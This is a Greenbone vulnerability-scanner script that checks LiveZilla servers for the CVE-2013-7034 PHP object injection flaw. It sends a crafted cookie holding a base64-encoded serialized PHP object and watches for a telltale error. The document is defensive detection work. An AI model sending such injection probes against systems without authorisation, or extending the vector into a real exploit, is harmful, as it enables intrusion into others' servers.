# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:livezilla:livezilla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802075");
  script_version("2023-07-26T05:05:09+0000");
  script_cve_id("CVE-2013-7034");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-05-21 11:01:15 +0530 (Wed, 21 May 2014)");
  script_name("LiveZilla PHP Object Injection Vulnerability");

  script_tag(name:"summary", value:"LiveZilla is prone to PHP object injection vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and try to execute serialized PHP object.");
  script_tag(name:"insight", value:"Flaw in the setCookieValue() function in the '_lib/functions.global.inc.php'
  script allow attacker to inject PHP objects.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject PHP objects
  via a user-controller cookie.");
  script_tag(name:"affected", value:"LiveZilla version before 5.1.2.1");
  script_tag(name:"solution", value:"Upgrade to version 5.1.2.1 or later.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/89796");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64383");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124445");
  script_xref(name:"URL", value:"http://forums.livezilla.net/index.php?/topic/163-livezilla-changelog/");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_livezilla_detect.nasl");
  script_mandatory_keys("LiveZilla/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.livezilla.net/downloads/en");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!lz_port = get_app_port(cpe:CPE)) exit(0);

if(!dir = get_app_location(cpe:CPE, port:lz_port)) exit(0);

host = http_host_name(port:lz_port);

if( dir == "/" ) dir = "";

post_data = string("p_request=extern&p_action=mail");
post_data_len = strlen(post_data);
lz_path = dir + "/server.php";

referer = string("http://", host, dir, "/chat.php");

lz_req = 'POST ' + lz_path + ' HTTP/1.1\r\n' +
         'Host: ' + host + '\r\n' +
         'Content-Type: application/x-www-form-urlencoded\r\n' +
         'Cookie: livezilla=Tzo0OiJUZXN0IjowOnt9\r\n' +
         'Referer: '+ referer + '\r\n' +
         'Content-Length: ' + post_data_len + '\r\n' +
         '\r\n' + post_data;
lz_res = http_keepalive_send_recv(port:lz_port, data:lz_req, bodyonly:FALSE);

if("Cannot use object of type __PHP_Incomplete_Class as array" >< lz_res &&
   "_lib/functions.global.inc.php" >< lz_res)
{
  security_message(port:lz_port);
  exit(0);
}

exit(99);